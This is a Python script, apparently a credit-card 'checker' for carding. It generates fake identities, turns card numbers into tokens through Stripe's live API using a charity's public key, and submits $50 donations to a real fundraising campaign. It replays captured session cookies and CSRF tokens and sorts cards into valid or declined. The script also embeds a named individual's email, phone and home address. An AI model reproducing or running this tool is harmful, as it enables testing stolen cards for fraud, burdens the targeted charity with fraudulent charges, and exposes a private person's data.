import requests
import json
import random
import string
import requests
import re
import uuid

head1={
	'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
	'Pragma':'no-cache',
	'Accept':'*/*',
	}
response1 = requests.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()
for x in response1['results']:
	name=x['name']['first']
	second=x['name']['last']
	ciudad=x['location']['city']
	estado=x['location']['state']
	pais=x['location']['country']
	codigo_postal=x['location']['postcode']
	email=(name+second+'898@outlook.com').lower()
	fullname=name+' '+second
cookies2 = {'content-type':'application/x-www-form-urlencoded',}
Guid=str(requests.post('https://m.stripe.com/4',headers=head1,cookies=cookies2).text)
Muid=str(uuid.uuid1())
Sid=str(uuid.uuid1())

def pregs(list):
    arrays = re.findall(r'[0-9]+', list)
    return arrays

list = '00000000000000000|00|0000|000'

def main(list):
	arrs = pregs(list)
	cc = arrs[0]
	month = arrs[1]
	year = arrs[2]
	cvc = arrs[3]

	url = 'https://api.stripe.com/v1/sources'

	headers = {

		'authority': 'api.stripe.com',
		'method': 'POST',
		'path': '/v1/sources',
		'scheme': 'https',
		'accept': 'application/json',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'en-US,en;q=0.9',
		'content-length': '467',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'referer': 'https://js.stripe.com/v3/controller-a092d919df8c657b83c9e943ae46c0fe.html',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/81.0.4044.122 Chrome/81.0.4044.122 Safari/537.36',
		
		}

	postdata = {
	
		'type': 'card',
		'card[number]': cc,
		'card[cvc]': cvc,
		'card[exp_month]': month,
		'card[exp_year]': year,
		'guid': '64987ea3-f936-45e2-bdb3-a1b47631048638a633',
		'muid': 'ee1e3649-9171-493b-a0cd-9683f46f558e562eda',
		'sid': '2a58a940-b788-4d3a-8410-022d597097891e2f79',
		'pasted_fields': 'number',
		'payment_user_agent': 'stripe.js/bb105d64d; stripe-js-v3/bb105d64d',
		'time_on_page': '133021',
		'referrer': 'https://fundraise.becauseinternational.org/give/115950/',
		'key': 'pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz',
	
		}

	post = requests.post(url = url, headers = headers, data = postdata)
	post = json.loads(post.text)
	id = post["id"]
	print(id)
	
	url = 'https://api.stripe.com/v1/payment_pages/cs_live_a1IZfJbaGdGFmPg60hFqK36eVVn1VjSQtxMQ7bPd9p6bnzw9MOrxOAwDVJ/confirm'

	headers = {
	
		'authority': 'fundraise.becauseinternational.org',
		'method': 'POST',
		'path': '/frs-api/campaign/115950/',
		'scheme': 'https',
		'accept': 'application/json, text/plain, */*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'en-US,en;q=0.9',
		'content-length': '1809',
		'content-type': 'application/json;charset=UTF-8',
		'cookie': 'connect.sid=s%3A4AnYXFlrGv14U8cWx_Cp7h6lvzt3JWER.NduY5V3VZmPobbzc9jBbYE64dtuMOBLnlQ0I8d1ss6g; __cf_bm=905f86cb67d06af3c833ec1a61caec21536016b0-1626821276-1800-AYDhUJuQt2Ol8Bx73Is4lNwV8DZ3VYmkES9LlUrONB/6J2j4UIv0D2zYqYb8Z08y/RchhZSBlzbP9OoZDeCXnTk=; _ga=GA1.2.1689090082.1626821261; _gid=GA1.2.476999337.1626821261; _hp2_id.1566116007=%7B%22userId%22%3A%22339609895901531%22%2C%22pageviewId%22%3A%226457551202532714%22%2C%22sessionId%22%3A%223577193343364166%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; CSRF-TOKEN=Pu7UUCxU-Vv1hrsEBMZnaKgZbzw_UU1alBv8; __stripe_mid=ee1e3649-9171-493b-a0cd-9683f46f558e562eda; __stripe_sid=2a58a940-b788-4d3a-8410-022d597097891e2f79; _hp2_props.1566116007=%7B%22environment%22%3A%22prod%22%2C%22organization_id%22%3A21391%2C%22payment_processor%22%3A%22Authorize.net%22%2C%22campaign%22%3A115950%2C%22campaign_type%22%3A%22p2p%22%2C%22duplicate_fundraisers%22%3Atrue%2C%22existing_fundraiser%22%3Afalse%7D; OptanonConsent=landingPath=https%3A%2F%2Ffundraise.becauseinternational.org%2Fgive%2F115950%2F%23!%2Fdonation%2Fcheckout&datestamp=Tue+Jul+20+2021+17%3A47%3A46+GMT-0500+(Central+Daylight+Time)&version=3.6.25&EuOnly=false; prodperfect_session={%22session_uuid%22:%22ac43ac1f-0e19-41ac-9111-0b6ba8614afb%22}; keen={%22uuid%22:%223bbc2569-af66-4d96-9ee0-747b9bea57a8%22%2C%22initialReferrer%22:null}; _hp2_ses_props.1566116007=%7B%22ts%22%3A1626821262509%2C%22d%22%3A%22fundraise.becauseinternational.org%22%2C%22h%22%3A%22%2Fgive%2F115950%2F%22%2C%22g%22%3A%22%23!%2Fdonation%2Fcheckout%22%7D; _fbp=fb.1.1626821268398.128431523; acceptCookies=eyJpdiI6Inl2RHBaTlZGTWlZTk1mU1huYUxKUUE9PSIsInZhbHVlIjoickthSm9ZaCtnZUtLK2lxcHJkNFNjUT09IiwibWFjIjoiYzA1NGI2OTZmYTZkMGY2MmFmMDY4MzQzMDk1NjM0MDBlM2RhZjU2ZjU0MTZmZWU4ZTRhMWJhYTM0MjcyN2M0MCJ9; XSRF-TOKEN=eyJpdiI6ImpwNnlZZVEweGwzaTZ6WmR1VG1wK2c9PSIsInZhbHVlIjoiQUlVbm1QUys5d0c2ZjlHU0FQVDZYcVwvNCtcL3V0WFdVNzFqSDZTQVVjXC8xdFllY3NzV3Z6amhKR0JJb2VSbWVWdXpuRXBWd2RPVkVtSXVWOW1xcDZDZnc9PSIsIm1hYyI6IjZlZTM0NDM2Mzk0NWVkZmM3MmZjMmYyYzEzMTBjNTVjYjcyODVlMzAxNWIyMDkxYTJiMTNiODM0ZmY2YzA2YmUifQ%3D%3D; sid=eyJpdiI6InM2RjBLRWcxXC9oRlFia28zNHZCdGlnPT0iLCJ2YWx1ZSI6Ik0zVHRGZFBGOHV4Rkc0QTZYdnNoeUxNMzFIZEJCVXRPak1EZU1Fdis5MmxsRXVIZ2hsY25sMHdoemRFOElhSVZZZHJGRVJTaG1kNmV0ditrTnhoa1JnPT0iLCJtYWMiOiIzMTliNTFkYmE0YjllZjRiM2U3NThmZGE4YzkwYjQ4YWQxMTM3MTI5ZGU2OTY4NDVmMDc0Y2M5NmY3MmZhZDVhIn0%3D',
		'csrf-token': 'qCsHBj2e-9Tu8OKsyFJY05FeKkPyOsH-yB1o',
		'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQyMzc4NyIsImFwIjoiMzYzNzUxMTgzIiwiaWQiOiIyZGNiN2QzODFhZGQyMWEzIiwidHIiOiIyN2Y5YzVhMmEzMzY5NmVhZTkyMTVhODE2YjhiY2VkMCIsInRpIjoxNjI2ODIxMzk1MTk0fX0=',
		'origin': 'https://fundraise.becauseinternational.org',
		'referer': 'https://fundraise.becauseinternational.org/give/115950/',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'traceparent': '00-27f9c5a2a33696eae9215a816b8bced0-2dcb7d381add21a3-01',
		'tracestate': '423787@nr=0-1-423787-363751183-2dcb7d381add21a3----1626821395194',
		'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/81.0.4044.122 Chrome/81.0.4044.122 Safari/537.36',
		'x-newrelic-id': 'UAQEVl5UGwAGV1ZQBgMEVg==',
		'x-xsrf-token': 'Pu7UUCxU-Vv1hrsEBMZnaKgZbzw_UU1alBv8',
		
		}

	postdata = '{"payment":{"raw_currency_code":"USD","paypal":{"status":"inactive"},"ach":{"status":"ready"},"stripe":{"status":"ready","source":{"id":"src_1JFRlPB7LFlNoUGL0FYQmPoF","object":"source","amount":null,"card":{"exp_month":9,"exp_year":2022,"last4":"5616","country":"US","brand":"Visa","cvc_check":"unchecked","funding":"credit","three_d_secure":"optional","name":null,"address_line1_check":null,"address_zip_check":null,"tokenization_method":null,"dynamic_last4":null},"client_secret":"src_client_secret_hfwunhEmyxCtcTB5AKPzsMFL","created":1626821411,"currency":null,"flow":"none","livemode":true,"owner":{"address":null,"email":null,"name":null,"phone":null,"verified_address":null,"verified_email":null,"verified_name":null,"verified_phone":null},"statement_descriptor":null,"status":"chargeable","type":"card","usage":"reusable"}},"cc":{"status":"ready"},"creditee_team_id":null,"method":"Stripe","gateway":{"id":"22801","name":"STRIPE","currency":"USD"}},"frequency":"one-time","items":[{"type":"donation","product_name":"Donation","raw_final_price":50}],"fundraising_page_id":null,"fundraising_team_id":null,"designation_id":25250,"answers":[],"comment":"","member_name":"Jaime Isay","member_email_address":"joseeelopez10@gmail.com","member_phone":"2412212214","is_anonymous":false,"opt_in":true,"opt_in_wording":"It's okay to contact me in the future.","application_id":"5706","billing_first_name":"Jaime","billing_last_name":"Isay","billing_address1":"bosques de quiroga 46","billing_address2":"Villas doña marina","billing_city":"Tzompantepec","billing_state":"Tlaxcala","billing_postal_code":"90490","billing_country":"MX","fee_on_top":true,"fixed_fot_percent":3,"fixed_fot_enabled":true,"dedication":null,"company_name":null,"member_first_name":"Jaime","member_last_name":"Isay","employer_match":null}'

	now = requests.post(url = url, headers = headers, data = postdata)
	load = json.loads(now.text)
	#print(now.text)
	
	time = now.elapsed.total_seconds()
	time = str(time)
	time = time[0:4]+'s'
	
	print('[*] Tu tarjeta por checar: ' + cc + '|' + month + '|' + year + '|' + cvc)

	if 'Registration' in now.text:
		print('CC: '+list+' Message: '+load["error"]+' Time: '+time)

	elif 'redirect' in now.text:
		print('CC: '+list+' Message: Succes'+' Time: '+time)

	else:
		if 'decline_code' in now.text:
			declinecode = load["error"]["code"]
		else:
			declinecode = load["error"]["message"]
			print('CC: '+list+ ' Respuesta: '+declinecode+' Time: '+time)
			
	

#   https://checkout.stripe.com/pay/cs_live_a1fzj7Ryt2GWQyOBAJ4Yajg35UKNd63u5lRL2Icyye4UhtMAilW6Shh02U#fidkdWxOYHwnPyd1blppbHNgWlRAfFREcH88Qn12XFF9Vj1kRFRqUkw1VTU1QndqfUNmYEcnKSdobGF2Jz9%2BJ2JwbGEnPyc8M2M9ZmQxYyg8NmNmKDE1ZDQoZDZkMSg3PGY9YDwzMTM0N2M1Z2EwZzwnKSdocGxhJz8nYWFnYWA3MDEoPDcyZigxZj0zKDxkNTIoPTRnZzVhZGY2PGZhMjJhZjYwJykndmxhJz8nYWczZ2BhPWQoYDxmMSgxYDUyKDxkZjEoMjJjMGQzMDFhN2QxYTM1NWQ8J3gpJ2dgcWR2Jz9eWCknaWR8anBxUXx1YCc%2FJ3Zsa2JpYFpscWBoJyknd2BjYHd3YHdKd2xibGsnPydtcXF1dj8qKmhqa3FgdnZqd2wodWR3cWtgd3ZtbHV2K2p3Yid4JSUl
